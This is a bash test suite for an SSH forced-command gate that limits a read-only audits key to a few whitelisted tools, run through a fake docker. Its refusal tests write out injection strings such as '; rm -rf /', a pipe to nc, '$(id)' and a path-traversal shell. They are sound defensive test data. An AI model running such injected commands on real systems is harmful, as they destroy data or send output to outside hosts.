#!/usr/bin/env bash
# Tests of predigol-audits (plan PICKS, F1/F2/F6): the forced command of the read-only audits key. A fake docker. No network, no root.
# usage: tests/vps_shell/test_audits_gate.sh [path/to/predigol-audits]
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
GATE=${1:-$HERE/../../deploy/release/templates/gate/predigol-audits}
PASS=0; FAIL=0
ok() { PASS=$((PASS + 1)); echo "ok   $*"; }
no() { FAIL=$((FAIL + 1)); echo "FAIL $*"; }
eq() { if [[ "$1" == "$2" ]]; then ok "$3"; else no "$3: got '$1', expected '$2'"; fi; }

T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
mkdir -p "$T/bin"
cat > "$T/bin/docker" <<'FAKE'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$FAKE_DIR/docker.argv"
echo "fake tool output"
exit 0
FAKE
chmod +x "$T/bin/docker"
export FAKE_DIR=$T PATH="$T/bin:$PATH" PREDIGOL_AUDITS_LOG="$T/log" SSH_CLIENT="203.0.113.9 5555 22"

# run the gate as sshd would; leaves the output in $OUT and the status in $RC
gate() { : > "$T/docker.argv"; OUT=$(SSH_ORIGINAL_COMMAND="$1" bash "$GATE" < /dev/null 2>&1); RC=$?; }
ran() { cat "$T/docker.argv"; }

# --- what the key may do -------------------------------------------------------------------------------------------
gate "audit_picks_module"
eq "$RC" 0 "the baseline runs with no option"
eq "$(ran)" "exec -w /app predigol-worker python -m scripts.audit_picks_module" "  in the worker, as a module of scripts"
gate "audit_picks_module --hours 24 --json"
eq "$RC" 0 "the baseline with --hours and --json"
eq "$(ran)" "exec -w /app predigol-worker python -m scripts.audit_picks_module --hours 24 --json" "  the options reach the tool as given"
gate "audit_settlement --days 30 --no-timing --json"
eq "$RC" 0 "the settlement audit with its three options"
eq "$(ran)" "exec -w /app predigol-worker python -m scripts.audit_settlement --days 30 --no-timing --json" "  as given"
gate "research_picks_calibration --days 400"
eq "$RC" 0 "the F2 research up to 400 days"
gate "research_picks_calibration --json"
eq "$RC" 0 "the F2 research as JSON"
gate "help"
eq "$RC" 0 "help answers"
[[ "$OUT" == *"audit_settlement"* && -z "$(ran)" ]] && ok "  help lists the tools and runs nothing" || no "  help lists the tools and runs nothing"
[[ "$(cat "$T/log")" == *"OK client=203.0.113.9 audit_picks_module"* ]] && ok "an allowed call is logged with the client" || no "an allowed call is logged with the client"

# --- what it may not ----------------------------------------------------------------------------------------------
refused() { # <command> <label>
  gate "$1"
  if [[ "$RC" == 126 && -z "$(ran)" ]]; then ok "refused: $2"; else no "refused: $2 (rc=$RC, ran='$(ran)')"; fi
}
refused "" "no command (no interactive shell)"
refused "bash" "a shell"
refused "sh -c id" "a shell with a command"
refused "audit_picks_module; rm -rf /" "a second command after ;"
refused "audit_picks_module && id" "a second command after &&"
refused "audit_picks_module | nc 1.2.3.4 9" "a pipe"
refused 'audit_picks_module $(id)' "a substitution"
refused "audit_picks_module --hours 24 > /tmp/x" "a redirection"
refused "../../bin/sh" "a path"
refused "scripts.resettle --apply" "another script of the repository"
refused "resettle" "the resettlement, which writes"
refused "audit_settlement --apply" "an option no tool has"
refused "audit_picks_module --days 30" "an option of another tool"
refused "audit_picks_module --no-timing" "a flag of another tool"
refused "audit_picks_module --hours" "a number flag without its number"
refused "audit_picks_module --hours 0" "zero hours"
refused "audit_picks_module --hours 169" "more hours than a week"
refused "audit_settlement --days 91" "more than 90 days of settlement"
refused "research_picks_calibration --days 401" "more than 400 days of research"
refused "audit_settlement --days 1000" "a number of four digits"
refused "audit_settlement --days -5" "a negative number"
refused "audit_settlement --days 30 --days 7" "the same option twice"
refused "audit_settlement --json --json" "the same flag twice"
refused "AUDIT_SETTLEMENT" "upper case"
refused "audit_settlement --days 30 $(printf 'x%.0s' {1..120})" "a command too long"
[[ "$(cat "$T/log")" == *"REFUSED client=203.0.113.9"* ]] && ok "a refusal is logged with the client" || no "a refusal is logged with the client"

echo "RESULT: $PASS ok, $FAIL failed"
(( FAIL == 0 ))
